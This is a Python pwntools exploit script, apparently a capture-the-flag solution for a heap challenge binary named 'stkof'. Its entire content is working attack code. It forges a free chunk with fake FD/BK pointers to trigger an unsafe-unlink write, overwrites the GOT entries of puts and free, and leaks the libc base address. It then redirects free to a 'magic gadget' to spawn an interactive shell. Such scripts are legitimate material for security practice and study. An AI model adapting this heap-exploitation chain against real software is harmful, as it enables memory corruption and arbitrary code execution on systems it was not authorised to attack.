from pwn import *

FILENAME = "./stkof"
e = ELF(FILENAME)

def alloc(size):
    p.sendline("1")
    p.sendline(str(size))
    res = p.recvline().rstrip()
    p.recvline()
    return res

def read(index, data):
    p.sendline("2")
    p.sendline(str(index))
    p.sendline(str(len(data)))
    p.sendline(data)
    p.recvline()

def dealloc(index):
    p.sendline("3")
    p.sendline(str(index))
    p.recvline()

p = process(FILENAME, env={"LD_PRELOAD": "./libc-2.25-no-tcache.so"})
gdb.attach(p)

alloc(0x80)



alloc(0x80)
alloc(0x80)

ptr_addr = 0x602150
sizeof_ptr = 8

payload =  p64(0)*2
payload += p64(ptr_addr - sizeof_ptr*3)      # FD
payload += p64(ptr_addr - sizeof_ptr*2)      # BK
payload += p64(0)*12
payload += p64(0x80)                         # fake prev_size
payload += p64(0x90)                         # chunk size (bit prev in use = 0)

read(2, payload)
dealloc(3)

#pause()
payload =  p64(0)*2
payload += p64(e.got['puts'])
payload += p64(e.got['free'])
read(2, payload)
#pause()

read(2, p64(e.plt['puts']+0x6))
dealloc(1)

p.readline()
p.readline()

libc_addr = u64((p.readline().rstrip().ljust(8, '\x00'))) - 0x6e570
log.success("LEAKED LIBC BASE ADDRESS " + hex(libc_addr))


read(2, p64(libc_addr + 0x45682))             # magic gadget
dealloc(2)


p.interactive()
p.close()